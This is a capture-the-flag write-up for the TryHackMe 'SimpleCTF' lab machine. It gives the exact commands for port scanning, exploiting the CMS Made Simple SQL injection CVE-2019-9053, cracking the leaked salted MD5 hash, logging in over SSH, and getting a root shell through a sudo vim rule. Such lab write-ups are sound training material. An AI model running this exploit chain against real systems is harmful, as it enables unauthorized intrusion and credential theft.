# SimpleCTF — TryHackMe

## Info

| Field      | Details                                                  |
| ---------- | --------------------------------------------------------- |
| Platform   | TryHackMe                                                  |
| Difficulty | Easy                                                       |
| OS         | Linux (Ubuntu 16.04)                                       |
| Topics     | Anonymous FTP, CMS Exploitation (SQLi), Hash Cracking, SSH, Sudo Privilege Escalation |

---

## Summary

SimpleCTF is a Linux machine that starts with an anonymous FTP share leaking a hint about weak/reused credentials, leads to an unauthenticated SQL injection (CVE-2019-9053) in CMS Made Simple 2.2.8 to dump an admin hash and salt, and ends with privilege escalation through a misconfigured `sudo` rule on `vim`.

---

## Reconnaissance

### Full Port Scan

```
nmap -sS -p- 10.113.145.244
```

This runs against all 65535 TCP ports to avoid missing anything outside nmap's default top-1000.

**Open ports:** 21 (FTP), 80 (HTTP), 2222 (SSH)

The SSH port being non-standard (2222 instead of 22) is worth flagging early — it matters once we try to connect later.

### Service Detection

```
nmap -sV -sC -p 21,80,2222 10.113.145.244
```

Key findings:

- **FTP**: vsftpd 3.0.3, anonymous login allowed
- **HTTP**: Apache 2.4.18 (Ubuntu), default page, `robots.txt` present
- **SSH**: OpenSSH 7.2p2 (Ubuntu) on port 2222

---

## Enumeration

### FTP

Anonymous login confirmed by nmap was used manually:

```
ftp 10.113.145.244
Name: anonymous
230 Login successful.
```

Passive mode wasn't returning listings correctly, so active mode was forced instead. Inside `/pub`, a single file was found:

```
ForMitch.txt
```

Contents:

```
Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
```

This is a strong hint that whatever credentials surface on the web app are reused for a system-level (SSH) account.

### Web

Checked `robots.txt` from the nmap output first — turned out to be the generic default CUPS template, not anything specific to this box. It disallows `/openemr-5_0_1_3`, which led nowhere (see Dead Ends below).

Directory brute-forcing with gobuster:

```
gobuster dir -u http://10.113.145.244/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,js,py,html
```

Relevant hits:

```
/index.html           (Status: 200)
/robots.txt           (Status: 200)
/simple                (Status: 301) --> /simple/
```

Visiting `/simple` revealed **CMS Made Simple version 2.2.8**, vulnerable to **CVE-2019-9053** — an unauthenticated SQL injection that leaks the admin's password hash and salt.

---

## Exploitation — CMS Made Simple 2.2.8 (CVE-2019-9053)

Used a public exploit script (`46635.py`), written for Python 2. Running it under Python 3 failed immediately:

```
SyntaxError: Missing parentheses in call to 'print'
```

After installing dependencies and switching to `python2`:

```
python2 46635.py -u http://10.113.145.244/simple
```

Output:

```
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
```

The SQLi leaked a username (`mitch`), an MD5 hash, and its salt.

### Cracking the Hash

CMS Made Simple salts passwords as `md5($salt . $pass)`, which is hashcat **mode 20**, not mode 10 (`md5($pass.$salt)`). The first two attempts got this wrong:

**Wrong mode (10):**
```
hashcat -O -a 0 -m 10 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2 rockyou.txt
```
Result: exhausted, 0 cracked — wrong hashing scheme.

**Correct mode (20), wrong field order:**
```
hashcat -O -a 0 -m 20 1dac0d92e9fa6bb2:0c01f4468bd75d7a84c7eb73846e8d96 rockyou.txt
```
Result: `Token length exception` — hashcat expects `hash:salt`, not `salt:hash`.

**Correct mode, correct order:**
```
hashcat -O -a 0 -m 20 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2 rockyou.txt
```
Result: cracked instantly.

```
0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2:secret
```

Credentials recovered: **mitch : secret** — matching the FTP note about a reused weak password.

---

## Initial Access — SSH as mitch

SSH was open on port **2222**, not the default 22:

```
ssh mitch@10.113.145.244 -p 2222
```

Login succeeded with `mitch:secret`.

### User Flag

```
cat user.txt
```

`G00d j0b, keep up!`

---

## Privilege Escalation — sudo vim (GTFOBins)

Checked sudo permissions:

```
sudo -l
```

```
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

`vim` is a classic GTFOBins entry — it can be run as root with no password and used to break out into a privileged shell:

```
sudo vim -c ':!/bin/bash'
```

This spawns a root shell directly through vim's command execution.

### Root Flag

```
cat /root/root.txt
```

`W3ll d0n3. You made it!`

---

## What Failed / Dead Ends

- `robots.txt` disallowed `/openemr-5_0_1_3` — this turned out to be the generic default CUPS robots.txt template, not specific to the box. Visiting the path directly led nowhere.
- First hashcat attempt used mode 10 (`md5($pass.$salt)`) — wrong scheme for CMS Made Simple, which uses mode 20 (`md5($salt.$pass)`).
- Second hashcat attempt used the correct mode but the wrong field order (`salt:hash` instead of `hash:salt`), causing a token length exception.

---

## Key Takeaways

- Always check anonymous FTP/SMB shares — they often leak operational intel, not just files.
- Don't skip non-standard ports found in the initial `-p-` scan (here, SSH on 2222).
- Know your hash format before throwing it at hashcat — mode and field order both matter.
- `sudo -l` should be one of the first things checked after any foothold.
